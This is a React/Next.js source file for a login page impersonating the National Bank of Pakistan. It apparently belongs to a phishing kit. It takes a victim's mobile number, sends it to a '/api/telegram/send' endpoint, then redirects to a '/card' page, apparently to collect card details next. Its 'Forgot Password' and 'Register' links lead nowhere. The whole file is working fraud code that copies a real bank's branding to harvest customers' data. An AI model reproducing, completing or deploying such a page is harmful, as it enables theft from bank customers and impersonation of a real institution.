'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { saveSubmissionData } from '@/lib/submission-store'

const logoImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'

function formatMobile(value: string) {
  const digits = value.replace(/\D/g, '').slice(0, 11)
  if (digits.length <= 4) return digits
  return `${digits.slice(0, 4)}-${digits.slice(4)}`
}

export default function LoginPage() {
  const router = useRouter()
  const [mobile, setMobile] = useState('')
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault()
    if (submitting) return

    const digits = mobile.replace(/\D/g, '')
    if (digits.length !== 11) {
      setError('Please enter a valid 11-digit mobile number.')
      return
    }
    setError('')
    setSubmitting(true)

    try {
      const data = saveSubmissionData({ mobile })
      await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(data),
      })
    } catch {
      // Continue navigation even if the notification fails
    } finally {
      router.push('/card')
    }
  }

  return (
    <main className="login-screen flex min-h-screen flex-col items-center justify-center px-4 py-10">
      <div className="w-full max-w-[400px]">
        <section className="rounded-3xl bg-white px-6 py-8 shadow-[0_20px_45px_rgba(0,0,0,0.18)]">
          <div className="flex flex-col items-center text-center">
            <img
              src={logoImage || '/placeholder.svg'}
              alt="National Bank of Pakistan logo"
              className="h-14 w-auto object-contain"
            />
            <h1 className="mt-4 text-base font-medium text-[#555555]">National Bank of Pakistan</h1>
            <p className="mt-1 text-sm text-[#8a8a8a]" dir="rtl" lang="ur">
              نیشنل بینک آف پاکستان
            </p>
          </div>

          <form className="mt-8" onSubmit={handleSubmit}>
            <label htmlFor="mobile" className="block text-sm font-medium text-[#333333]">
              Mobile Number
            </label>
            <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
              <span className="pl-4 pr-3 text-sm font-semibold text-[#8a8a8a]">PK</span>
              <span className="h-6 w-px bg-[#e0e0e0]" />
              <input
                id="mobile"
                inputMode="tel"
                autoComplete="tel"
                value={mobile}
                onChange={(event) => {
                  setMobile(formatMobile(event.target.value))
                  if (error) setError('')
                }}
                placeholder="03XX-XXXXXXX"
                className="h-full w-full bg-transparent px-3 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
              />
            </div>
            {error ? (
              <p className="mt-2 text-xs font-medium text-[#c0392b]">{error}</p>
            ) : (
              <p className="mt-2 text-xs text-[#8a8a8a]">Format: 03XX-XXXXXXX</p>
            )}

            <button
              type="submit"
              disabled={submitting}
              className="mt-5 flex h-14 w-full items-center justify-center rounded-full bg-gradient-to-r from-[#1f8a4c] to-[#0d5228] text-base font-bold text-white shadow-[0_8px_18px_rgba(16,82,40,0.28)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-70"
            >
              {submitting ? 'Please wait…' : 'Continue'}
            </button>

            <div className="mt-5 text-center">
              <a href="#" className="text-sm font-semibold text-[#1a1a1a] underline underline-offset-4">
                Forgot Password / Pin?
              </a>
            </div>
          </form>
        </section>

        <div className="mt-6 text-center">
          <a href="#" className="text-sm font-bold text-white underline underline-offset-4">
            Register here
          </a>
        </div>
      </div>
    </main>
  )
}
